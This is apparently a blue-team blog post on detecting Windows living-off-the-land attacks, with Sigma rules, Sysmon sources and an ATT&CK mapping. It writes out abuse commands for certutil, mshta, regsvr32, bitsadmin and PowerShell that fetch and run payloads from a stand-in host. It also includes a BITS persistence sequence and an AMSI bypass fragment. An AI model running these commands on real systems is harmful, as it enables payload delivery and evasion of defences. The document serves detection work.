---
title: "Detecting Living Off the Land Attacks: When Attackers Use Your Own Tools Against You"
date: 2026-03-21
author: "Andy"
categories:
- "Blue Team"
- "Threat Detection"
tags:
- "LOLBins"
- "detection"
- "MITRE-ATT&CK"
- "Sysmon"
- "blue-team"
description: "LOLBins are hard to detect because they're legitimate tools. Here's how to find the malicious use without drowning in noise."
read_time: 10
---

# Detecting Living Off the Land Attacks: When Attackers Use Your Own Tools Against You

> *The most dangerous malware might not be malware at all — it's the tools your OS ships with.*

---

## What Makes LOLBins So Effective

"Living off the land" (LotL) attacks abuse legitimate built-in system binaries to perform malicious activity. The technique works because:

1. **Whitelisting doesn't help** — these binaries are on every Windows system and are trusted by default
2. **AV/EDR may not flag them** — security tools are trained to allow signed Microsoft binaries
3. **They blend into normal traffic** — `powershell.exe` runs a thousand times a day on most enterprise machines
4. **No malware to drop** — fileless execution leaves minimal forensic artifacts

This is why nation-state actors and sophisticated ransomware groups rely heavily on LotL techniques. It's not laziness — it's deliberate evasion.

---

## The Most Abused LOLBins (And What Attackers Do With Them)

### `certutil.exe`
**Legitimate use**: Certificate management, CRL retrieval
**Abuse**: Download files, decode Base64, encode payloads

```
# Download a payload
certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\temp\p.exe

# Decode a Base64-encoded payload
certutil.exe -decode payload.b64 payload.exe
```

**Detection signals**: `-urlcache` + `-split` + HTTP URL; `-decode` on suspicious file extensions

---

### `mshta.exe`
**Legitimate use**: Execute HTML Application (.hta) files
**Abuse**: Execute remote scripts, bypass application control

```
# Execute remote HTA
mshta.exe http://evil.com/payload.hta

# Execute VBScript inline
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd /c whoami"":close")
```

**Detection signals**: `mshta.exe` with HTTP URLs in command line; `mshta.exe` spawning `cmd.exe` or `powershell.exe`

---

### `regsvr32.exe` (Squiblydoo)
**Legitimate use**: Register/unregister COM DLLs
**Abuse**: Execute arbitrary code via scrobj.dll, bypass AppLocker

```
# Execute remote scriptlet
regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll
```

**Detection signals**: `regsvr32.exe` with `/i:http` in command line; network connections originating from `regsvr32.exe`

---

### `rundll32.exe`
**Legitimate use**: Execute DLL functions
**Abuse**: Execute malicious DLLs, run JavaScript via `url.dll`

```
# Execute JavaScript via url.dll
rundll32.exe url.dll,OpenURL javascript:...

# Load malicious DLL
rundll32.exe C:\temp\evil.dll,DllMain
```

**Detection signals**: `rundll32.exe` spawning child processes; `url.dll` with JavaScript; network connections from `rundll32.exe`; loading DLLs from temp directories

---

### `wmic.exe`
**Legitimate use**: WMI queries, system management
**Abuse**: Remote execution, reconnaissance, lateral movement

```
# Remote process creation
wmic /node:TARGET process call create "cmd.exe /c payload.exe"

# Reconnaissance
wmic computersystem get name,username
wmic product get name,version
```

**Detection signals**: `wmic /node:` with remote targets; `process call create`; `wmic` spawning interpreters

---

### `bitsadmin.exe`
**Legitimate use**: Background Intelligent Transfer Service management
**Abuse**: Download files, persist via scheduled jobs

```
# Download a file
bitsadmin /transfer job http://evil.com/payload.exe C:\temp\payload.exe

# Create a persistent job
bitsadmin /create job
bitsadmin /addfile job http://evil.com/payload.exe C:\temp\payload.exe
bitsadmin /SetNotifyCmdLine job C:\temp\payload.exe NUL
bitsadmin /resume job
```

**Detection signals**: `bitsadmin` with external URLs; `SetNotifyCmdLine` with executable paths; BITS jobs executing files from temp directories

---

### `PowerShell.exe` / `pwsh.exe`
**Legitimate use**: Everything
**Abuse**: Everything

PowerShell deserves special attention because it's both ubiquitous and incredibly powerful for attackers.

Key abuse patterns:
```powershell
# Download and execute in memory (no disk artifact)
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')

# Encoded command (obfuscation)
powershell -EncodedCommand JABjAD0A...

# Bypass execution policy
powershell -ExecutionPolicy Bypass -File payload.ps1

# AMSI bypass attempts
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
```

**Detection signals**: Encoded commands (`-EncodedCommand`); `DownloadString` / `DownloadFile` / `WebClient`; `-ExecutionPolicy Bypass`; AMSI-related strings; PowerShell spawning from Office applications

---

## Sigma Rules for LOLBin Detection

Here are production-ready Sigma rules for the highest-value detections:

### certutil Download Detection
```yaml
title: Certutil Download
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\certutil.exe'
    CommandLine|contains:
      - '-urlcache'
      - '-VerifyCtl'
  filter_legitimate:
    CommandLine|contains:
      - 'microsoft.com'
      - 'windows.com'
  condition: selection and not filter_legitimate
level: high
tags:
  - attack.t1105
  - attack.t1140
```

### Suspicious mshta Execution
```yaml
title: Mshta Executing Remote Script
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    Image|endswith: '\mshta.exe'
  selection_cli:
    CommandLine|contains:
      - 'http://'
      - 'https://'
      - 'vbscript:'
      - 'javascript:'
  condition: selection_img and selection_cli
level: high
tags:
  - attack.t1218.005
```

### PowerShell Download Cradle
```yaml
title: PowerShell Download Cradle
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
    CommandLine|contains:
      - 'DownloadString'
      - 'DownloadFile'
      - 'WebClient'
      - 'Invoke-WebRequest'
      - 'curl '
      - 'wget '
  condition: selection
falsepositives:
  - Legitimate admin scripts (review and tune)
level: medium
tags:
  - attack.t1059.001
  - attack.t1105
```

---

## Detection Architecture for LOLBins

You won't catch LOLBin abuse with just process creation logs. You need multiple data sources:

| Data Source | What it Catches |
|---|---|
| **Sysmon Event ID 1** (Process Create) | Command line arguments, parent-child relationships |
| **Sysmon Event ID 3** (Network Connection) | Outbound connections from unexpected processes |
| **Sysmon Event ID 7** (Image Loaded) | DLLs loaded by suspicious processes |
| **Sysmon Event ID 11** (File Created) | Files dropped to temp/unusual directories |
| **Windows Event ID 4688** | Process creation (requires audit policy + command line logging) |
| **PowerShell Event ID 4104** | Script block logging — captures decoded PS commands |

**Sysmon is not optional.** Windows native logging doesn't capture command line arguments by default, and without those, LOLBin detection is nearly impossible.

---

## Practical Tuning Approach

LOLBin rules will generate false positives. Here's how to tune them without breaking detection:

1. **Build an allowlist of known-good command patterns** — especially for IT management tooling (SCCM, Intune, monitoring agents)
2. **Identify which accounts legitimately use these binaries** — service accounts for patch management, IT admin accounts
3. **Exclude known software update paths** — Windows Update uses certutil, BITS, and others legitimately
4. **Use parent process context** — `mshta.exe` spawned by `explorer.exe` (user opened an HTA file) is different from `mshta.exe` spawned by `winword.exe` (Office macro attack)

The goal is not to suppress all LOLBin alerts — it's to suppress the patterns that are consistently legitimate so the unusual ones stand out.

---

## MITRE ATT&CK Coverage Map

| LOLBin | Primary Techniques |
|---|---|
| certutil | T1105 (Ingress Tool Transfer), T1140 (Deobfuscate/Decode) |
| mshta | T1218.005 (Signed Binary Proxy Execution: Mshta) |
| regsvr32 | T1218.010 (Signed Binary Proxy Execution: Regsvr32) |
| rundll32 | T1218.011 (Signed Binary Proxy Execution: Rundll32) |
| wmic | T1047 (Windows Management Instrumentation) |
| bitsadmin | T1197 (BITS Jobs), T1105 (Ingress Tool Transfer) |
| PowerShell | T1059.001 (Command and Scripting Interpreter: PowerShell) |

Map your detections to ATT&CK. It helps prioritize coverage gaps and communicate coverage to leadership.

---

*Want to see these rules in action? The next post covers [Windows Event Log configuration](#) — the foundation every detection depends on.*
